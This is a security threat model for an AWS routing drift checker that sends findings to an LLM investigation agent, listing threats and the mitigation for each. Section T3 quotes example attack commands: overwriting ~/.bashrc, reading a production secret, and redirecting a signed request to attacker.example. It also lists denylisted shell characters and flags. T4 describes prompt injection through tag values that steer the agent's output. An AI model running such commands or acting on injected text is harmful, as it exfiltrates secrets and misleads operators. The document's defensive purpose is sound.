# Security Threat Model — Network Routing Drift Checker

Security-reviewed before public publishing.

**Verification:** initially verified 2026-10-18, re-verified 2026-10-19 against the pre-release
security review findings below.
Every mitigation below is cited to a file in `src/`, `infra/`, or `tests/` that was read directly as
part of this verification — none are asserted from the design doc alone. Source model:
`docs/security/threat-model.md` (2026-10-16), re-verified and reformatted here. No threat was found to target a surface that doesn't exist; no claimed mitigation
was found to be absent from the code. The system has 10 Lambda functions (`init`, `collect-cloudwan`,
`collect-region`, `evaluate`, `diff`, `batch-findings`, `investigate`, `callback`,
`merge-investigations`, `report` — `.kiro/specs/network-routing-drift-checker/design.md` §2.1); all
10 are covered by at least one threat below.

**Update 2026-10-18:** a pre-release security scan found a HIGH-severity finding on the
cross-account callback invoke grant (T8 below), fixed before the security review. **Update
2026-10-19 (pre-release security review):** two blocking findings (T3/T4's validation-command
check, and missing non-production wording in the README) fixed; see T3 for the fix and the README's status line for the corrected
wording. Several advisory, non-blocking documentation-accuracy notes from the same review (stale
residual-risk references, a stale copy of the threat model, an out-of-date IAM report) are also
corrected below and in the regenerated `docs/security/iam-report.md`.

## Risk Summary

| STRIDE Category | HIGH | MEDIUM | LOW | Total |
|---|---|---|---|---|
| Spoofing | 0 | 1 | 0 | 1 |
| Tampering | 2 | 2 | 0 | 4 |
| Repudiation | 0 | 0 | 0 | 0 |
| Information Disclosure | 1 | 2 | 0 | 3 |
| Denial of Service | 0 | 1 | 0 | 1 |
| Elevation of Privilege | 1 | 2 | 0 | 3 |
| **Total** | **4** | **8** | **0** | **12** |

**HIGH-severity gate:** 4 HIGH-severity threats identified, **all 4 MITIGATED** with evidence below.
**Unmitigated HIGH count: 0 → PASS.**

## System and trust boundaries

```
Networking account (N)                                   Agent Space account (D, optional, may equal N)
┌────────────────────────────────────────────────┐       ┌──────────────────────────────────────┐
│ Scheduler ─► Step Functions ─► Lambdas          │       │ AWS DevOps Agent Agent Space          │
│   read-only APIs: EC2/TGW, Network Manager,     │ HTTPS │   generic webhook (HMAC)              │
│   Direct Connect, VPN                           │──────►│   investigation (LLM) under its own   │
│   own data: S3 (intent, runs), DynamoDB, SNS    │       │   role; reads N via a secondary role  │
│   investigate ─ HMAC secret from SSM ───────────┘       │                                       │
│   callback ◄── aws.aidevops events ─────────────────────┤ EventBridge rule (link stack)         │
│      └─ sts:AssumeRole ─────────────────────────────────► journal-reader role (link stack)     │
└────────────────────────────────────────────────┘       └──────────────────────────────────────┘
        SNS e-mail ─► people (report text includes agent-written content)
```

Boundaries: (1) the checker and the customer's network, (2) the checker and DevOps Agent (data out
via webhook, data back via journal), (3) account N and account D, (4) the report and its readers.

## Assets

| Asset | Where | Sensitivity |
|---|---|---|
| Network topology and routing state (snapshots, findings) | S3 `runs/` (30 days), DynamoDB | Internal: reveals network design |
| Intent file (intended design) | S3 `intent/`, versioned | Internal; integrity matters: it decides what is drift |
| HMAC webhook secret | SSM SecureString in N | Secret |
| Step Functions task tokens | DynamoDB `TOKEN#` items (TTL) | Secret-like: completes a waiting task |
| Report | SNS subscribers | Internal |

## Detailed Findings

### Spoofing

- **[MEDIUM] A forged event completes or fails a waiting investigation task (T6).**
  Component: `src/handlers/callback.py`.
  Mitigation: No inbound HTTP endpoint exists (zero-ingress by construction — Step Functions
  `waitForTaskToken` plus an EventBridge rule, not a webhook server). Only AWS can emit `aws.*`
  source events; the rule is filtered to one Agent Space ID. The callback re-reads the
  investigation from the Agent Space journal and acts only when the first journal message
  carries an `[INVESTIGATION_ID:nrdc-...]` tag matching a live `TOKEN#<id>` DynamoDB item.
  Status: **MITIGATED.** Evidence: `tests/iam/test_template.py::test_zero_ingress` (asserts no
  `AWS::Lambda::Url`/API Gateway/ALB/security-group resource exists in the synthesized template);
  `src/handlers/callback.py` lines 11-15, 304-315 (tag extraction + live-token check before acting).
  The forwarder role's trust (companion link stack) is pinned to `events.amazonaws.com` with
  `aws:SourceAccount` and `aws:SourceArn` scoped to the one EventBridge rule — not a bare account
  principal (corrected 2026-10-19; this note previously pointed at a residual-risk item that no
  longer exists, see T8). Residual (T-014, pre-release security review): any viewer of the Agent
  Space, or another holder of a shared webhook secret (see the README's shared-webhook option),
  sees the `nrdc-` tag and finding IDs in the journal and could complete the waiting task with
  crafted report text — this threat model assumes every viewer of the Agent Space is trusted by the
  customer. Not mitigated in code; stated here as a trust-boundary assumption the customer should
  be aware of before sharing one Agent Space or webhook across teams.

### Tampering

- **[HIGH] An LLM-controlled report could carry a mutating command (T3).**
  Component: `src/drift_core/investigation.py`.
  Mitigation: Every `validation_commands` entry must pass four independent checks or the whole
  batch is invalidated (`SendTaskFailure(SCHEMA_INVALID)`, report falls back to raw findings with
  no agent text): no shell metacharacter (`;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, newline/CR); no
  flag that changes where or how the request is sent or lets it read/write an arbitrary local file
  (`--endpoint-url`, `--cli-input-json`/`-yaml`, `--no-verify-ssl`, `--ca-bundle`,
  `file://`/`fileb://`); the service is one of exactly `ec2`, `networkmanager`, `directconnect`
  (not any read-capable AWS service — this is the fix for a security review finding below); and every
  token after the operation is a flag or a flag's value, never a bare positional argument.
  **The pre-release security review found and this release fixes:** the original check (schema pattern
  plus shell-metacharacter denylist only) accepted `aws s3api get-object --bucket b --key k
  ~/.bashrc` (overwrites a file on the human operator's workstation — the report shows these
  commands as "Verify (read-only):" for a person to run, and the last argument of `get-object` is
  the local output path), `aws secretsmanager get-secret-value --secret-id prod/db` (right verb
  shape, wrong service — exfiltrates a secret into the report), and `aws ec2 describe-vpcs
  --endpoint-url https://attacker.example` (redirects the signed request to an attacker host).
  Status: **MITIGATED.** Evidence: `src/drift_core/investigation.py` lines 26-55
  (`_ALLOWED_COMMAND_SERVICES`, `_FORBIDDEN_IN_COMMANDS_FLAGS`, `_command_errors`), 156-196
  (`validate_result`); `tests/unit/test_investigation.py::test_security_review_attack_commands_rejected`,
  `tests/unit/test_skill_package.py::test_commands_the_skill_forbids_are_rejected`.
  **Residual (T-013, pre-release security review):** the checker never executes a command — the
  report asks a *human* to run it to verify the hypothesis. A tag value or resource name an
  attacker can set (anyone who can tag a TGW attachment, which needs far less privilege than
  anyone who can change routing — this is the same injection source T4 already names) could still
  steer the agent toward writing a technically-valid, in-allowlist command whose *arguments*
  encode something misleading (not unsafe to run, since every accepted command is read-only by
  construction, but potentially pointed at the wrong resource to obscure the real finding). This
  is a lower-severity residual than the fixed issue: nothing the human runs can mutate or
  exfiltrate, but the report's trustworthiness still rests on the human noticing a mismatch.

- **[HIGH] Prompt injection via finding text (tag values, resource names) steering the agent's output (T4).**
  Component: `src/drift_core/investigation.py`, `src/drift_core/webhook.py`.
  Mitigation: Findings reach the agent as structured, labelled data, not instructions. The agent's
  JSON reply is validated against a strict schema scoped to the batch's own finding IDs; scores and
  ranking are recomputed by code, not trusted from the model; any link in the reply is accepted only
  if it points into the same Agent Space web app as the known default URL, otherwise the default is
  substituted. Nothing the agent returns is ever executed by the checker — see T3 above for the
  fixed gap where this guarantee did not, until this release, extend to what the report asks a
  *human* to execute from their own terminal.
  Status: **MITIGATED.** Evidence: `src/drift_core/investigation.py` lines 127-158
  (`validate_result`), 199-210 (`_trusted_url`), 211-231 (`normalize`);
  `tests/unit/test_investigation.py::test_investigation_url_must_point_into_the_agent_space`.

- **[MEDIUM] An LLM investigation step hallucinates or suppresses drift (T2).**
  Component: `src/drift_core/report.py`, state-machine `Evaluate`/`Diff` steps.
  Mitigation: Drift (NEW/KNOWN/RESOLVED) is decided entirely by deterministic code before any
  hand-off to the agent; the agent only explains findings that deterministic code already
  identified as NEW. It cannot add, remove, or reclassify a finding.
  Status: **MITIGATED** for safety (what counts as drift is never agent-controlled). Residual
  usefulness risk — grouping/explanation quality is unscored, since evals were explicitly deferred
  to post-v1 (user decision 2026-10-16; see `.kiro/specs/network-routing-drift-checker/requirements.md`
  §11.5) — not a safety gap. Evidence: `tests/unit/test_golden.py`.

- **[MEDIUM] A tampered intent file hides real drift (T10).**
  Component: `src/drift_core/intent.py`, `infra/lib/drift-checker-stack.ts` (bucket).
  Mitigation: The intent bucket is private (`BlockPublicAccess.BLOCK_ALL`), KMS-encrypted,
  versioned, and TLS-only (`enforceSSL: true`); the run manifest records which intent version was
  used, and the report states explicitly when the intent file is absent or rejected.
  Status: **MITIGATED** within the checker's own control plane. Residual: any principal in account N
  who already holds `s3:PutObject` on the `intent/` prefix can still change what counts as drift —
  this is a customer-side IAM boundary, not a checker flaw (Residual risk #4 below; README should
  recommend restricting this to the network team).
  Evidence: `infra/lib/drift-checker-stack.ts` line 187 (`versioned: true, blockPublicAccess:
  BLOCK_ALL, enforceSSL: true`); `tests/unit/test_intent.py`.

### Repudiation

No threats identified in this category — every handler emits structured JSON logs keyed by `run_id`
(`src/drift_core/logging_util.py::log_event`, called from every handler in `src/handlers/`), giving
every state-machine step an auditable, correlatable record, but no mutating action exists whose
originator could plausibly be disputed (the checker makes no write/mutate calls into the customer's
network — see T1).

### Information Disclosure

- **[HIGH] The webhook HMAC secret leaks (T5).**
  Component: `src/handlers/investigate.py`, `src/drift_core/logging_util.py`.
  Mitigation: The secret is read from SSM SecureString at invocation time only — never placed in
  environment variables, Step Functions state, or S3. It (and the webhook URL and task tokens) are
  registered on a logger redaction list that replaces them with `[REDACTED]` wherever they'd appear
  in any emitted log line, including inside exception text.
  Status: **MITIGATED.** Evidence: `src/drift_core/logging_util.py` lines 23-33 (`register_secret`,
  `redact`), 44-50 (`JsonFormatter.format` calls `redact` on every line);
  `tests/unit/handlers/test_investigate.py::test_secret_and_url_never_in_logs_returns_errors_artifacts_or_env`;
  `tests/unit/test_logging_util.py`.

- **[MEDIUM] Finding data leaves the account via the webhook (T9).**
  Component: `src/drift_core/webhook.py`.
  Mitigation: Hand-off is opt-in (disabled by default). Only NEW findings — IDs, kinds, resource
  IDs, prefixes, tag values, short messages — are sent, over HTTPS only, to a URL that must match a
  fixed pattern (`https://event-ai.<region>.api.aws/webhook/generic/<id>`); anything else raises
  `WebhookConfigError` and the webhook URL itself is never echoed back in that error.
  Status: **MITIGATED.** Evidence: `src/drift_core/webhook.py` lines 38-42 (`_URL_RE`), 81-84
  (validation + non-echo); `tests/unit/test_webhook.py`.

- **[MEDIUM] Data at rest exposure of topology/state (T12).**
  Component: `infra/lib/drift-checker-stack.ts`.
  Mitigation: One customer-managed KMS key with rotation enabled encrypts the S3 bucket, the
  DynamoDB state table, the SNS topic, and the callback DLQ; the state table has point-in-time
  recovery enabled.
  Status: **MITIGATED.** Evidence: `infra/lib/drift-checker-stack.ts` lines 172-176
  (`enableKeyRotation: true`), 199-203 (`TableEncryption.CUSTOMER_MANAGED`,
  `pointInTimeRecoveryEnabled: true`); `tests/iam/test_template.py`.

### Denial of Service

- **[MEDIUM] Silent failure is reported indistinguishably from "no drift" (T11).**
  Component: `src/handlers/pipeline.py` (`report_handler`), `src/drift_core/report.py`.
  Mitigation: A clean run always sends an explicit heartbeat message naming how many checks ran out
  of how many; a failed or skipped run raises CloudWatch alarms to the same SNS topic; partial
  evaluation is never composed as a clean "no drift" report.
  Status: **MITIGATED.** Evidence: `tests/unit/test_evaluate_report.py::test_clean_run_heartbeat_with_skipped_checks_line`
  (asserts the heartbeat subject/body names skipped-check counts, not a bare "all clear").

### Elevation of Privilege

- **[HIGH] The checker performs a mutating action against the customer's network (T1).**
  Component: all 10 Lambda functions' IAM policies, `infra/lib/drift-checker-stack.ts`.
  Mitigation: Every customer-facing IAM action is restricted by regex to `Describe`/`Get`/`List`/
  `Search` verbs on EC2/TGW, Network Manager, and Direct Connect
  (`tests/iam/test_iam_lint.py` line 20, `READ` pattern); no managed policies are attached to any
  role; a deny-by-default lint fails the build on any action outside a checked-in allowlist, any
  wildcard action, undocumented `Resource: "*"`, or `NotAction`/`NotResource`. The lint's own
  negative test (`test_lint_catches_violations`) proves it actually fails on a bad statement,
  guarding against a vacuous pass. **Updated 2026-10-18 (pre-release review finding):** three Direct
  Connect/EC2 read actions (`DescribeDirectConnectGateways`, `DescribeDirectConnectGatewayAssociations`,
  `DescribeVirtualInterfaces`, `SearchTransitGatewayRoutes`) were on `Resource: "*"` with code
  comments claiming they don't support resource-level permissions; the AWS Service Authorization
  Reference says otherwise for all four. Rescoped to their documented resource types
  (`dx-gateway`, `dxcon`/`dxlag`/`dxvif`, `transit-gateway-route-table`) under this account, the
  narrowest static scope available since specific resource IDs aren't known before discovery runs.
  This is a tightening within the same "resource-level permissions where they exist" principle T1
  already required — not a new mitigation category.
  Status: **MITIGATED.** Evidence: `tests/iam/test_iam_lint.py` —
  `test_every_action_is_allowlisted_and_not_wildcarded`,
  `test_star_resource_only_for_reads_and_service_requirements`, `test_no_managed_policies_on_roles`,
  `test_lint_catches_violations`; `docs/security/iam-report.md`;
  `infra/lib/drift-checker-stack.ts` (`ReadDirectConnectGateways`,
  `ReadDirectConnectVirtualInterfacesForDiscovery`, `ReadVirtualInterfaces`,
  `SearchTransitGatewayRoutes` policy statements).

- **[MEDIUM] The callback role completes task tokens belonging to other state machines (T7).**
  Component: `infra/lib/drift-checker-stack.ts`.
  Mitigation: `SendTask*` permission is granted via CDK's `stateMachine.grantTaskResponse(callbackFn.role)`,
  which scopes the resulting IAM statement's resource to this one state machine's ARN, not `*`.
  Verified live against a deployed stack 2026-10-15 (per design.md §7.2, §14 item 5).
  Status: **MITIGATED.** Evidence: `infra/lib/drift-checker-stack.ts` line 591
  (`stateMachine.grantTaskResponse(callbackFn.role)`).

- **[MEDIUM] Cross-account role abuse between the networking account and the Agent Space account (T8).**
  Component: `infra/lib/devops-agent-link-stack.ts`, `infra/lib/drift-checker-stack.ts`.
  Mitigation: The journal-reader role's trust policy is pinned to the exact callback-role ARN via
  `aws:PrincipalArn`, admitting no other principal in account N, with no external ID needed since
  both accounts belong to the same customer. The forwarder role's trust is pinned to
  `events.amazonaws.com` with `aws:SourceAccount` and `aws:SourceArn` scoped to the one EventBridge
  rule. The journal-reader's only permission is `aidevops:ListJournalRecords` on one named Agent
  Space ARN. The callback's cross-account invoke grant is pinned, symmetrically, to the exact
  event-forwarder role ARN via `aws:PrincipalArn` on an `AWS::Lambda::ResourcePolicy` statement —
  not a bare account-ID principal, which would have admitted every IAM principal in account D.
  `deploy.sh` probes all three pins and fails closed if any is wrong.
  Status: **MITIGATED.** Fixed 2026-10-18 (pre-release security scan HIGH finding): the callback's cross-account
  grant previously used `AWS::Lambda::Permission` with a bare account-ID principal, because the
  legacy `AddPermission`/`CfnPermission` mechanism's `SourceArn`/`SourceAccount` condition keys are
  populated by an AWS *service* principal acting on behalf of its own resource, not by a directly
  calling cross-account IAM role — so there was no way to further scope that principal with the
  older mechanism. `AWS::Lambda::ResourcePolicy` (CDK `lambda.CfnResourcePolicy`) is a newer,
  separate resource type that supports the full IAM condition-key range on a full-JSON policy
  document, including `aws:PrincipalArn`; the forwarder role's ARN is deterministic from its fixed
  name (`EVENT_FORWARDER_ROLE_FORMAT` in `src/drift_core/cross_account.py`) and the checker stack's
  own account/Region, so it can be referenced before the companion stack creates the role — the
  same technique already used for the journal-reader ARN just above it in the same file. The two
  resource types are kept on separate conditions (`SameAccountHandoff` only ever uses
  `AWS::Lambda::Permission`, `CrossAccountHandoff` only ever uses `AWS::Lambda::ResourcePolicy`),
  per the CloudFormation guidance against mixing both on one function.
  Evidence: `infra/lib/devops-agent-link-stack.ts` lines 49, 59-70;
  `infra/lib/drift-checker-stack.ts` (`forwarderRoleArn`, `CallbackFromAgentSpaceAccount`
  resource policy); `tests/iam/test_template.py::test_cross_account_permission_is_scoped_to_the_forwarder_role`.

## Residual risks (accepted for a prototype, documented in the README)

1. **Agent-written free text** (title, hypothesis, evidence observations) appears in the report.
   Validated for shape and length, not meaning. Clearly labelled as the investigation's output; its
   link goes only into the customer's own Agent Space.
2. **DevOps Agent's own mitigation step** may propose changes inside the Agent Space. The checker
   never executes anything; the skill forbids change plans for `nrdc-` incidents; the Agent Space's
   role in account N is read-only.
3. **Anyone in account N who can already write the bucket's `intent/` prefix can change what counts
   as drift** (T10, above). README should recommend restricting `s3:PutObject` on it to the network
   team.
4. **Investigation evals deferred to post-v1** (user decision 2026-10-16, requirements §11.5):
   grouping/explanation quality is unscored. Usefulness risk, not a safety risk (T2, above).
5. **T-013 (pre-release security review):** even with the service/flag/positional-argument checks
   now enforced (T3), an attacker who can tag a resource could still steer the agent's validation
   command toward an argument value that misleads a human reviewer, without the command itself
   being unsafe to run. See T3 above.
6. **T-014 (pre-release security review):** this threat model assumes every viewer of the Agent
   Space, and every holder of a shared webhook secret, is trusted by the customer; the README's
   shared-webhook option widens the set of people who can see or complete a task. See T6 above.

(Former residual risk 1 — "cross-account callback permission names account D, not the forwarder
role ARN" — was fixed 2026-10-18; see T8 above. It is removed here, not renumbered-and-kept, since
it no longer applies.)
